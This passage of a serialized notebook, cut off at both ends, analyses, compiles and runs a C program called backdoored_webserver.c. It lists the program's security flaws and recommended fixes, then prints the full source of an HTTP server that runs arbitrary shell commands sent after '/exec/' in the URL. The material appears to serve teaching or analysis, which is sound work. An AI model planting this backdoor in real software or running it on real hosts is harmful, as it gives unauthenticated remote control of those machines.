","position":{"start":{"line":67,"column":1},"end":{"line":67,"column":1}},"key":"A974pbPes2"},{"type":"inlineCode","value":"/exec/","position":{"start":{"line":67,"column":1},"end":{"line":67,"column":1}},"key":"VF1fuHC5bh"},{"type":"text","value":".","position":{"start":{"line":67,"column":1},"end":{"line":67,"column":1}},"key":"QWRa7APKM9"}],"key":"uKlk5WdH9S"}],"key":"KOj5VC1HIO"},{"type":"listItem","spread":true,"position":{"start":{"line":70,"column":1},"end":{"line":72,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":70,"column":1},"end":{"line":71,"column":1}},"children":[{"type":"strong","position":{"start":{"line":70,"column":1},"end":{"line":70,"column":1}},"children":[{"type":"inlineCode","value":"execute_command_return_output","position":{"start":{"line":70,"column":1},"end":{"line":70,"column":1}},"key":"XCGr7ckx98"},{"type":"text","value":":","position":{"start":{"line":70,"column":1},"end":{"line":70,"column":1}},"key":"c2FkdDRXbE"}],"key":"Qr6j13iE2d"},{"type":"text","value":"\nExecutes a shell command using ","position":{"start":{"line":70,"column":1},"end":{"line":70,"column":1}},"key":"Ilf9xxLqjg"},{"type":"inlineCode","value":"popen","position":{"start":{"line":70,"column":1},"end":{"line":70,"column":1}},"key":"nelxH5G1Vz"},{"type":"text","value":" and captures its output.","position":{"start":{"line":70,"column":1},"end":{"line":70,"column":1}},"key":"zRx0Xf0NJ2"}],"key":"BAZb8akTrd"}],"key":"lO2qcXZxnS"}],"key":"lR9g4w82rS"},{"type":"thematicBreak","position":{"start":{"line":73,"column":1},"end":{"line":73,"column":1}},"key":"pYsll2QesW"},{"type":"heading","depth":3,"position":{"start":{"line":75,"column":1},"end":{"line":75,"column":1}},"children":[{"type":"strong","position":{"start":{"line":75,"column":1},"end":{"line":75,"column":1}},"children":[{"type":"text","value":"Key Vulnerabilities and Concerns","position":{"start":{"line":75,"column":1},"end":{"line":75,"column":1}},"key":"GYecW6fZQh"}],"key":"N6UgsXxHkh"}],"identifier":"key-vulnerabilities-and-concerns","label":"Key Vulnerabilities and Concerns","html_id":"key-vulnerabilities-and-concerns","implicit":true,"key":"mF9sJavBrZ"},{"type":"list","ordered":true,"start":1,"spread":false,"position":{"start":{"line":76,"column":1},"end":{"line":93,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":76,"column":1},"end":{"line":78,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":76,"column":1},"end":{"line":76,"column":1}},"children":[{"type":"strong","position":{"start":{"line":76,"column":1},"end":{"line":76,"column":1}},"children":[{"type":"text","value":"Backdoor Implementation:","position":{"start":{"line":76,"column":1},"end":{"line":76,"column":1}},"key":"NSem19qlTz"}],"key":"vTngZd9Zos"}],"key":"B3UFUcNKAy"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":77,"column":1},"end":{"line":78,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":77,"column":1},"end":{"line":78,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"The ","position":{"start":{"line":77,"column":1},"end":{"line":77,"column":1}},"key":"r2qYODuzaZ"},{"type":"inlineCode","value":"/exec/","position":{"start":{"line":77,"column":1},"end":{"line":77,"column":1}},"key":"qh6LfmmiE2"},{"type":"text","value":" functionality allows remote execution of arbitrary shell commands, creating a severe security vulnerability.","position":{"start":{"line":77,"column":1},"end":{"line":77,"column":1}},"key":"BmK8jws6P4"}],"key":"G53bE27hCs"}],"key":"O2ZVl3EDWk"}],"key":"ibaG0378L4"}],"key":"X8PETfAe6N"},{"type":"listItem","spread":true,"position":{"start":{"line":79,"column":1},"end":{"line":81,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":79,"column":1},"end":{"line":79,"column":1}},"children":[{"type":"strong","position":{"start":{"line":79,"column":1},"end":{"line":79,"column":1}},"children":[{"type":"text","value":"Unsafe Command Execution:","position":{"start":{"line":79,"column":1},"end":{"line":79,"column":1}},"key":"uzeUioqhz0"}],"key":"yf5dXSmyIi"}],"key":"rgN1i3mTET"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":80,"column":1},"end":{"line":81,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":80,"column":1},"end":{"line":81,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"Commands are executed without validation or sanitization, exposing the server to command injection attacks.","position":{"start":{"line":80,"column":1},"end":{"line":80,"column":1}},"key":"wSbj8qIQbW"}],"key":"J161AcNV7M"}],"key":"HII2rf4LOb"}],"key":"aFeq7rWNqG"}],"key":"nrK1tuBYTt"},{"type":"listItem","spread":true,"position":{"start":{"line":82,"column":1},"end":{"line":84,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":82,"column":1},"end":{"line":82,"column":1}},"children":[{"type":"strong","position":{"start":{"line":82,"column":1},"end":{"line":82,"column":1}},"children":[{"type":"text","value":"Lack of Authentication:","position":{"start":{"line":82,"column":1},"end":{"line":82,"column":1}},"key":"lT6M8LTNxr"}],"key":"avbncZUT0I"}],"key":"SVYxA1zNer"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":83,"column":1},"end":{"line":84,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":83,"column":1},"end":{"line":84,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"No mechanism to authenticate or authorize incoming requests, making the server open to exploitation.","position":{"start":{"line":83,"column":1},"end":{"line":83,"column":1}},"key":"QnTPEBXtzC"}],"key":"Xc5w0xTr07"}],"key":"Yj9YQY6SAU"}],"key":"nxVXsCMlqt"}],"key":"U4FRH3D9pC"},{"type":"listItem","spread":true,"position":{"start":{"line":85,"column":1},"end":{"line":87,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":85,"column":1},"end":{"line":85,"column":1}},"children":[{"type":"strong","position":{"start":{"line":85,"column":1},"end":{"line":85,"column":1}},"children":[{"type":"text","value":"Memory Leaks and Errors:","position":{"start":{"line":85,"column":1},"end":{"line":85,"column":1}},"key":"uTj8gZWDjr"}],"key":"r3IQ5CBNSD"}],"key":"mK5XcEIBkW"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":86,"column":1},"end":{"line":87,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":86,"column":1},"end":{"line":87,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"The program lacks comprehensive error handling for ","position":{"start":{"line":86,"column":1},"end":{"line":86,"column":1}},"key":"upi9CPFvCd"},{"type":"inlineCode","value":"malloc","position":{"start":{"line":86,"column":1},"end":{"line":86,"column":1}},"key":"eTOu8hPsam"},{"type":"text","value":" and ","position":{"start":{"line":86,"column":1},"end":{"line":86,"column":1}},"key":"IMai6Sgc4O"},{"type":"inlineCode","value":"realloc","position":{"start":{"line":86,"column":1},"end":{"line":86,"column":1}},"key":"wWBLVS9T5L"},{"type":"text","value":", potentially leading to memory leaks.","position":{"start":{"line":86,"column":1},"end":{"line":86,"column":1}},"key":"OJoqMhYwxv"}],"key":"mKk3XsTWyC"}],"key":"X5x5JxJHee"}],"key":"sP53plojAj"}],"key":"VVvU24kqKE"},{"type":"listItem","spread":true,"position":{"start":{"line":88,"column":1},"end":{"line":90,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":88,"column":1},"end":{"line":88,"column":1}},"children":[{"type":"strong","position":{"start":{"line":88,"column":1},"end":{"line":88,"column":1}},"children":[{"type":"text","value":"Debug Information Exposure:","position":{"start":{"line":88,"column":1},"end":{"line":88,"column":1}},"key":"HSsPXkqOrL"}],"key":"rUCupMbRQr"}],"key":"sDB2RLzLRk"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":89,"column":1},"end":{"line":90,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":89,"column":1},"end":{"line":90,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"Printing debug information, such as the request content and decoded commands, can expose sensitive data.","position":{"start":{"line":89,"column":1},"end":{"line":89,"column":1}},"key":"zcSWnbzYH2"}],"key":"U0PFmt22zh"}],"key":"KYpfxHt1GP"}],"key":"n7AyxIG6tv"}],"key":"E07dXWQIw4"},{"type":"listItem","spread":true,"position":{"start":{"line":91,"column":1},"end":{"line":93,"column":1}},"children":[{"type":"paragraph","position":{"start":{"line":91,"column":1},"end":{"line":91,"column":1}},"children":[{"type":"strong","position":{"start":{"line":91,"column":1},"end":{"line":91,"column":1}},"children":[{"type":"text","value":"Non-Threaded Design:","position":{"start":{"line":91,"column":1},"end":{"line":91,"column":1}},"key":"JwCSdpUGWr"}],"key":"XTtIFcYWsa"}],"key":"irFg12IeJO"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":92,"column":1},"end":{"line":93,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":92,"column":1},"end":{"line":93,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"The server handles only one request at a time, which is inefficient for multiple clients.","position":{"start":{"line":92,"column":1},"end":{"line":92,"column":1}},"key":"cCUL9Qn6QG"}],"key":"q42EyDXn56"}],"key":"ZlyHsZXwgb"}],"key":"leMPVI9Lpk"}],"key":"C65jlNbxHA"}],"key":"KzZNx9GAQT"},{"type":"thematicBreak","position":{"start":{"line":94,"column":1},"end":{"line":94,"column":1}},"key":"BlZLZrfxH4"},{"type":"heading","depth":3,"position":{"start":{"line":96,"column":1},"end":{"line":96,"column":1}},"children":[{"type":"strong","position":{"start":{"line":96,"column":1},"end":{"line":96,"column":1}},"children":[{"type":"text","value":"Recommendations","position":{"start":{"line":96,"column":1},"end":{"line":96,"column":1}},"key":"vIEyopgNI2"}],"key":"zYV6MyFJRN"}],"identifier":"recommendations","label":"Recommendations","html_id":"recommendations","implicit":true,"key":"ig1o1sEHd1"},{"type":"list","ordered":false,"spread":false,"position":{"start":{"line":97,"column":1},"end":{"line":102,"column":1}},"children":[{"type":"listItem","spread":true,"position":{"start":{"line":97,"column":1},"end":{"line":97,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"Remove or restrict the ","position":{"start":{"line":97,"column":1},"end":{"line":97,"column":1}},"key":"rHbng9fK52"},{"type":"inlineCode","value":"/exec/","position":{"start":{"line":97,"column":1},"end":{"line":97,"column":1}},"key":"c8mG1Jhk3H"},{"type":"text","value":" functionality to prevent unauthorized command execution.","position":{"start":{"line":97,"column":1},"end":{"line":97,"column":1}},"key":"x3SVEkTvmF"}],"key":"fQnKa6QrT6"}],"key":"Gqobnm7Fdc"},{"type":"listItem","spread":true,"position":{"start":{"line":98,"column":1},"end":{"line":98,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"Implement input validation and sanitization.","position":{"start":{"line":98,"column":1},"end":{"line":98,"column":1}},"key":"l8ItZhO0vs"}],"key":"Q1MOA5JW07"}],"key":"MN26a4Cfpi"},{"type":"listItem","spread":true,"position":{"start":{"line":99,"column":1},"end":{"line":99,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"Add authentication mechanisms to ensure only authorized users can interact with the server.","position":{"start":{"line":99,"column":1},"end":{"line":99,"column":1}},"key":"z7dw3YTp8Y"}],"key":"vsDGyHn25g"}],"key":"pRBM6kJrDB"},{"type":"listItem","spread":true,"position":{"start":{"line":100,"column":1},"end":{"line":100,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"Use secure coding practices, such as properly managing memory allocations and handling errors.","position":{"start":{"line":100,"column":1},"end":{"line":100,"column":1}},"key":"LyGtGGf0sx"}],"key":"jaxGHO6bLh"}],"key":"VK0a3Z2E3B"},{"type":"listItem","spread":true,"position":{"start":{"line":101,"column":1},"end":{"line":102,"column":1}},"children":[{"type":"paragraph","children":[{"type":"text","value":"Improve the server’s architecture to support concurrent connections, possibly using threading or asynchronous I/O.","position":{"start":{"line":101,"column":1},"end":{"line":101,"column":1}},"key":"hn4sTYPZ3w"}],"key":"PyjW3LseA7"}],"key":"UP8LzQHHJZ"}],"key":"Z7bIkmt4MT"},{"type":"thematicBreak","position":{"start":{"line":103,"column":1},"end":{"line":103,"column":1}},"key":"H4ypdNqRud"},{"type":"paragraph","position":{"start":{"line":105,"column":1},"end":{"line":105,"column":1}},"children":[{"type":"text","value":"This code appears to be designed for demonstration or testing purposes rather than production use due to its significant security flaws.","position":{"start":{"line":105,"column":1},"end":{"line":105,"column":1}},"key":"Rh7L5UIj2b"}],"key":"xxEWAj6Dz1"}],"key":"CGYUyMmyn9"},{"type":"block","kind":"notebook-content","children":[{"type":"heading","depth":2,"position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"children":[{"type":"text","value":"Program Code","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"AG4J6xKugc"}],"identifier":"program-code","label":"Program Code","html_id":"program-code","implicit":true,"key":"aJ5StuDn9O"}],"key":"tGEY0hx9tW"},{"type":"block","kind":"notebook-content","children":[{"type":"include","file":"C_Code/backdoored_webserver.c","literal":true,"children":[{"type":"code","value":"#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\n// Line below for debug\n//#define PORT 8080\n\n// Size of the buffer to use for reading data from the socket\n#define BUFFER_SIZE 1024\n\n// Number of connections to queue\n#define NUM_CONNECTIONS 5\n\n// Function to send a response to the client\nint send_response(int sockfd, char* response);\n\n// Function to get the URL from the HTTP header\nchar * get_URL_from_header(char * buffer_in);\n\n// Function to decode the URL\nchar * URL_decode(char * URL_in);\n\n// Function to get the command from the decoded URL\nchar * get_CMD_from_decoded_URL(char * decoded_URL_in);\n\n// Function to check if the URL contains the string \"/exec\"\nint does_URL_contain_slash_exec(char * URL_in);\n\n// Function to execute a command and return the output to a buffer\nchar * execute_command_return_output(char * command_in);\n\nint main(int argc, char *argv[])\n{\n    // Holds the socket file descriptor\n    int sockfd;\n\n    // Holds the new socket file descriptor for the accepted connection\n    int new_sockfd;\n\n    // Holds the port number on which to listen for connections\n    int server_port;\n\n    // Structure that holds the address of the host and client\n    struct sockaddr_in host_addr, client_addr;\n\n    // Holds the size of the structures above\n    socklen_t sin_size;\n    \n    // Holds the number of bytes received\n    int recv_length = 1;\n    \n    // Holds the status of the setsockopt() call\n    int yes = 1;\n    \n    // Holds the data received over the socket\n    char buffer[BUFFER_SIZE];\n\n    // Holds the URL from the HTTP header\n    char * URL;\n\n    // Holds the decoded URL\n    char * decoded_URL;\n\n    // Holds the command extracted from the decoded URL\n    char * backdoor_command;\n\n    // Holds the output of the command\n    char * command_output;\n\n    // For debug\n    // Holds a 200 response to send to the client \n    char http200_response_no_length[] = \n        \"HTTP/1.1 200 OK\\x0D\\x0A\";\n    //    \"Content-Type: text/html\\x0D\\x0A\";\n\n    // Holds a 404 response to send to the client (no length field)\n    char http404_response_no_length[] = \n        \"HTTP/1.1 404 Not Found\\x0D\\x0A\";\n    //    \"Content-Type: text/html\\x0D\\x0A\";i\n\n    // Holds a 400 response to send to the client (no length field)\n    char http400_response_no_length[] = \n        \"HTTP/1.1 400 Bad Request\\x0D\\x0A\";\n\n    // Holds the html code for the 404 response.  May need to nix the HTML\n    // and just send the text.\n    char http404_html_code[] = \n        \"<html>\\r\\n\"\n            \"<head><title>404 Not Found</title></head>\\r\\n\"\n                \"<body>\\r\\n\"\n                    \"<h1>404 Not Found</h1>\\r\\n\"\n                    \"<p>The requested resource could not be found.</p>\\r\\n\"\n                \"</body>\\r\\n\"\n        \"</html>\\r\\n\";\n\n    char http404_response_no_html[] =\n        \"HTTP/1.1 404 Not Found\\r\\n\"\n        \"Content-Type: text/html\\r\\n\" \n        \"404 Not Found\\r\\n\"\n        \"The requested resource could not be found.\\r\\n\";\n\n    // This string will will be augmented with the content length\n    // not used for now.\n    char content_length_string[] = \"Content-Length: \";\n    \n    // Quality of life string for adding a carriage return and newline\n    // Will tack this on to content_length_string\n    //char CR_plus_NL[] = \"\\x0D\\x0A\";\n    char CR_plus_NL[] = \"\\x0D\\x0A\";\n\n    // Silly message to send in the content body.\n    // Change to actual html?\n    char message_to_send[] = \"Hello, World!\\r\\n\";\n\n    // The return status of the send function\n    int send_status = 0;\n\n    // Holds the content length of the reponse\n    int content_length = 0;\n\n    // Holds the built up 200 response to send to the client\n    char http200_response[8192] = \"\";\n\n    // Holds the built up 404 response to send to the client\n    char http404_response[1024] = \"\";\n\n    // Holds the built up 400 response to send to the client\n    char http400_response[1024] = \"\";\n\n    // Create normal 200 response to GET request (no length).\n    // The 200 response is used for debug.\n    strcat(http200_response, http200_response_no_length);\n    strcat(http200_response, CR_plus_NL);\n    //strcat(http200_response, message_to_send);\n    //printf(\"%s\", http200_response);               // for debug\n\n    // Create a 404 response by combining parts.\n    strcat (http404_response, http404_response_no_length);\n    strcat (http404_response, CR_plus_NL);\n    //strcat (http404_response, http404_html_code);\n    // For debug\n    //printf(\"\\n%s\", http404_response);               // for debug\n\n    // Create a 400 response by combining parts.\n    strcat (http400_response, http400_response_no_length);\n    strcat (http400_response, CR_plus_NL);\n\n    // Lines below for debug to see if port was passed in\n    printf(\"\\nThe number of command line arguments is -> %d\\n\", argc - 1);\n    printf(\"The command line argument is %s\\n\", argv[1]);\n\n    // Check to see if a port number was passed in and exit if not\n    if (argc == 1) {\n        printf(\"Port number not specified, exiting...\\n\");\n        exit(1);\n    }\n\n    // Convert the port number from a string to an integer\n    server_port = atoi(argv[1]);\n    \n    // Create the socket; fail if it can't be created\n    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)\n    {\n        perror(\"Error creating socket\");\n        exit(1);\n    }\n\n    // Set the socket options to allow the port to be reused\n    // fail if not successful to set options\n    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\n    {\n        perror(\"Error setting socket options\");\n        exit(1);\n    }\n\n    // Setup the main structure \n    // Set the address family to AF_INET (IPv4)\n    host_addr.sin_family = AF_INET;\n    // Set the port number to the port passed in.  Use htons() to convert.\n    host_addr.sin_port = htons(server_port);\n    // Set the IP address to INADDR_ANY (any IP address on the machine).\n    host_addr.sin_addr.s_addr = INADDR_ANY;\n    // Zero out the rest of the struct\n    memset(&(host_addr.sin_zero), '\\0', 8);\n\n    // Bind the socket to the port passed in\n    // Fail if not successful\n    if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\n    {\n        perror(\"Error binding to socket\");\n        exit(1);\n    }\n\n    // Listen on the socket for connections\n    // Fail if not successful\n    if (listen(sockfd, NUM_CONNECTIONS) == -1)\n    {\n        perror(\"Error listening on socket\");\n        exit(1);\n    }\n\n    // Main loop\n    while (1)\n    {\n        // Get size of the main structure\n        sin_size = sizeof(struct sockaddr_in);\n\n        // Accept a connection\n        // Fail if not successful\n        new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n        if (new_sockfd == -1)\n        {\n            perror(\"Error accepting connection\");\n            continue;\n        }\n\n        // Print a message to the console to show a connection was accepted\n        printf(\"Connection Accepted...\\n\");\n\n        // Receive the GET request from the client\n        // a -1 from the recv function indicates an error\n        // fail if not successful\n        recv_length = recv(new_sockfd, buffer, BUFFER_SIZE - 1, 0);\n        if (recv_length == -1)\n        {\n            perror(\"Error receiving message\");\n            exit(1);\n        }\n\n        // Terminate the GET request string with a null character\n        buffer[recv_length] = '\\0';\n\n        // Print the GET request to the console for debug\n        printf(\"RECV: %s\", buffer);\n\n        // Get the URL from the GET request\n        URL = get_URL_from_header(buffer);\n\n        // Decode the URL\n        decoded_URL = URL_decode(URL);\n\n        // Check to see if the URL is a backdoor command\n        if (does_URL_contain_slash_exec(decoded_URL) == 1)\n        {\n            // Get the command from the decoded URL\n            backdoor_command = get_CMD_from_decoded_URL(decoded_URL);\n\n            // Execute the command\n            command_output = execute_command_return_output(backdoor_command);\n\n            // Send the 200 response to the client\n            //send_status = send_response(new_sockfd, http200_response);\n            if (command_output != NULL) {\n                strcat(http200_response, command_output);\n            }\n\n            // Send a line break in html for debug\n            //send_status = send_response(new_sockfd, \"</br>\");\n            send_status = send_response(new_sockfd, http200_response);\n            \n            // Free the memory used by the command output and reset the http200_response\n            strcpy (http200_response, \"\");\n            strcat (http200_response, http200_response_no_length);\n            strcat (http200_response, CR_plus_NL); \n            free(command_output);\n        \n        // Handle the case where the request is invalid\n        } else if (strcmp (decoded_URL, \"INVALID\") == 0) {\n        \n            // Send the 400 response to the client\n            send_status = send_response(new_sockfd, http400_response);\n\n        // Handle the case where the request is not a backdoor command\n        } else if (does_URL_contain_slash_exec(decoded_URL) == 0)\n        {\n            // Send the 404 response to the client\n            send_status = send_response(new_sockfd, http404_response);\n        }\n\n        // Lines below for debug\n        // Use below for manual sending of data\n        //send_status = send(new_sockfd, message, sizeof(message), 0);\n        //if (send_status == -1)\n        //{\n        //    perror(\"Error sending message\");\n        //    exit(1);\n        //}\n\n        close(new_sockfd);\n    }\n\n    return 0;\n}\n\nint send_response(int sockfd, char* response) {\n\n    // Hold the number of bytes sent\n    int bytes_sent = 0;\n\n    // Holds the length of the response\n    int response_length = 0;\n\n   //char * error_response = \"Error executing command...\\n\";\n   char * error_response = \"\";\n\n    int error_response_length = 0;\n\n    // Check to see if the response is empty\n    // send an error response if it is\n    if (response == NULL) {\n        //error_response_length = strlen(error_response);\n        response_length = strlen(\"\");\n        bytes_sent = send(sockfd, response, response_length, 0);\n        \n    } else {\n        // Get the length of a successfully executed response\n        response_length = strlen(response);\n        bytes_sent = send(sockfd, response, response_length, 0);\n    }\n\n    // Check to see if the response was sent successfully\n    if (bytes_sent == -1){\n            perror(\"Error sending response\");\n            exit(1);\n        }\n\n    // Return the number of bytes sent\n    return (bytes_sent);\n}\n\n// This function returns the URL from the GET request\nchar * get_URL_from_header(char * buffer_in) {\n\n    // Get the method of the response\n    char * method = strtok(buffer_in, \" \");\n\n    // Check to see if the method is a \"GET\" or \"POST\"\n    if ((strcmp(method, \"GET\") == 0) || strcmp(method, \"POST\") == 0) {\n        return strtok(NULL, \" \");\n    } else {\n        // If the method is not a GET or POST, return invalid\n        return (\"INVALID\");\n    }\n}\n\n// This function decodes the URL encoded string and return the decoded string\nchar * URL_decode(char * URL_in) {\n    \n    // The length of the URL\n    int len = strlen(URL_in);\n\n    // Allocate memory for the decoded URL\n    char* decoded_url = (char*)malloc(len + 1);\n    \n    // The URL encoded token\n    char hex[3];\n\n    // Terminate the string\n    hex[2] = 0;\n\n    // Counter variables\n    int i = 0, j = 0;\n\n    // Loop through the URL and decode the tokens\n    for (i = 0; i < len; i++, j++) {\n        // Find the % character\n        if (URL_in[i] == '%') {\n\n            // Copy the next two characters after the % into the hex array\n            memcpy(hex, URL_in+i+1, 2);\n\n            // Convert the hex array to an integer and then a character and store in the decoded_url array\n            // at position zero\n            decoded_url[j] = (char) strtol(hex, NULL, 16);\n\n            // Advance the counter by two\n            i += 2;\n\n        } else {\n            // If the character is not a % then just copy it to the decoded_url array\n            decoded_url[j] = URL_in[i];\n        }\n    }\n    // Add the null character to the end of the decoded_url array\n    decoded_url[j] = 0;\n\n    printf(\"\\nDecoded URL: %s\\n\", decoded_url);\n\n    return decoded_url;\n}\n\n// This function checks to see if the URL contains the string \"/exec/\"\nint does_URL_contain_slash_exec(char * URL_in) {\n    \n    // Target string to search for\n    char * exec = \"/exec/\";\n\n    if (((strstr(URL_in, exec) != NULL)) && ((strlen(URL_in) == strlen(exec)))) {\n        return 0;\n    }\n\n    // Search for the target string in the URL\n    // Return 1 if found, 0 if not found\n    if (strstr(URL_in, exec) != NULL) {\n        return 1;\n    } else {\n        return 0;\n    }\n}\n\n// This function gets the command from the decoded URL\nchar * get_CMD_from_decoded_URL(char * URL_in) {\n    // This function gets the command from the decoded URL\n    // The command is the string after the /exec/ in the URL\n\n    // The command to be returned from this function\n    char * command = NULL;\n\n    // The location of the last character of \"/exec/\"\" in the URL\n    char * exec_location = strstr(URL_in, \"/exec/\");\n\n    // Fail if the exec_location is NULL\n    if (exec_location == NULL) {\n        command = \"\";\n        //perror(\"Error getting command from URL\");\n        printf(\"No command in URL!!!\\n\");\n        return command;\n        //exit(1);\n    }\n\n    // Get everything after the last character of \"/exec/\" in the URL\n    command = exec_location + strlen(\"/exec/\");\n\n    // Print the command for debug\n    printf(\"\\nCommand: %s\\n\", command);\n\n    // Return the command\n    return command;\n}\n\n// This function executes a command and returns the output \nchar * execute_command_return_output(char * command_in) {\n\n    // Local buffer to store a line of output\n    char local_buffer[1024];\n\n    // The output of the command that will be returned from this function\n    char * output = NULL;\n    \n    // The size of the output\n    size_t output_size = 0;\n\n    // The HTML break tag\n    char * html_break = \"</br>\";\n\n    // string that redirects stderr to stdout\n    char * redirect_std_err = \" 2>&1\";\n\n    // Get the length of the command\n    size_t command_in_length = strlen(command_in);\n\n    // Get the length of the redirect string\n    size_t redirect_std_err_length = strlen(redirect_std_err);    \n\n    // Allocate memory for the redirected command.  This will be a string that contains the command\n    // and the redirect string. (e.g. \"ls -l 2>&1\")\n    char * redirected_command_in = (char*)malloc(command_in_length + redirect_std_err_length + 1);\n\n    // Copy the command to the redirected command\n    strcpy(redirected_command_in, command_in);\n\n    // Append the redirect string to the redirected command\n    strcat(redirected_command_in, redirect_std_err);\n\n    // Use the popen function to execute the command and return the output to a stream\n    FILE* stream = popen(command_in, \"r\");\n    \n    // Read the output a line at a time and store it in the local buffer\n    while (fgets(local_buffer, sizeof(local_buffer), stream) != NULL) {\n\n        // Tack on an HTML break to the end of each line of output\n        //strcat(local_buffer, html_break);\n\n        // Get the size of a line of output\n        size_t buffer_length = strlen(local_buffer);\n\n        // Reallocate memory for the output\n        output = realloc(output, output_size + buffer_length + 1);\n\n        // Copy a line of output to the output string\n        memcpy(output + output_size, local_buffer, buffer_length);\n        \n        // Update the output size\n        output_size += buffer_length;\n\n        // Add the null character to the end of the output string\n        output[output_size] = '\\0';\n    }\n\n    // Close the stream\n    int result = pclose(stream);\n    if (result == -1) {\n        perror(\"Error closing stream\");\n        exit(1);\n    }\n\n    // Return the output of the command\n    return (output);\n}","lang":"c","filename":"backdoored_webserver.c","key":"FcJRNoaky3"}],"key":"PtRpBoHmmK"}],"key":"ETkaNDWCL0"},{"type":"block","kind":"notebook-content","children":[{"type":"heading","depth":2,"position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"children":[{"type":"text","value":"Compile the Code","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"dKVDpa4rJp"}],"identifier":"compile-the-code","label":"Compile the Code","html_id":"compile-the-code","implicit":true,"key":"SWzOs0IWn2"}],"key":"ioXTW960Yw"},{"type":"block","kind":"notebook-code","children":[{"type":"code","lang":"python","executable":true,"value":"import os\ncurr_dir = \"\"\ncurr_dir = os.getcwd()\n\ncode_dir = curr_dir + \"/\" + \"C_Code\"\nos.chdir(code_dir)","key":"DI6relb4hp"},{"type":"outputs","id":"_dzuTOUm57KTBI-WQvje-","children":[],"key":"AVkeI1oskT"}],"key":"oJV8ldeR6Q"},{"type":"block","kind":"notebook-code","children":[{"type":"code","lang":"python","executable":true,"value":"exec_status = os.system(\"gcc -ggdb3 -o backdoored_webserver backdoored_webserver.c\")","key":"ipajQ5Beiu"},{"type":"outputs","id":"eQXNgLWhFlPusk-_7-u8W","children":[],"key":"s1G54DxfSS"}],"key":"hPydPsyJQ6"},{"type":"block","kind":"notebook-content","children":[{"type":"heading","depth":2,"position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"children":[{"type":"text","value":"Run the Code","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"vvmVvWiAdF"}],"identifier":"run-the-code","label":"Run the Code","html_id":"run-the-code","implicit":true,"key":"BxRWzci8gU"}],"key":"sqQ1VUYS1T"},{"type":"block","kind":"notebook-content","children":[{"type":"paragraph","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"children":[{"type":"text","value":"Running the code starts a webserver that listens on the specified port as an argument. You can access the server by sending HTTP requests to the server’s IP address and port.  In this example, we will start the server on port 8080 like so:","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"FPKT6ya97U"}],"key":"p99BjRQ798"},{"type":"code","lang":"bash","value":"./backdoored_webserver 8080","position":{"start":{"line":3,"column":1},"end":{"line":5,"column":1}},"key":"mtzaAjkc2c"}],"key":"FGhA93vI8p"},{"type":"block","kind":"notebook-content","children":[{"type":"paragraph","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"children":[{"type":"text","value":"The output is as follows:","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"mLxk8WXCvm"}],"key":"Pog3k6zOMe"},{"type":"code","lang":"","value":"The number of command line arguments is -> 1\nThe command line argument is 8080","position":{"start":{"line":3,"column":1},"end":{"line":6,"column":1}},"key":"ysYXPhPYWE"}],"key":"G26e8XQawo"},{"type":"block","kind":"notebook-content","children":[{"type":"paragraph","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"children":[{"type":"text","value":"In another terminal, we use ","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"JGxQpWnpCN"},{"type":"inlineCode","value":"curl","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"aex0W3eB49"},{"type":"text","value":" to send an HTTP request to the server.  The curl command is as follows:","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"C5RF0Pe45B"}],"key":"Nuq36Z6sw6"},{"type":"code","lang":"bash","value":"curl -i http://127.0.0.1:8080","position":{"start":{"line":3,"column":1},"end":{"line":5,"column":1}},"key":"Eq7Z6CfjYi"},{"type":"paragraph","position":{"start":{"line":7,"column":1},"end":{"line":7,"column":1}},"children":[{"type":"text","value":"and the response 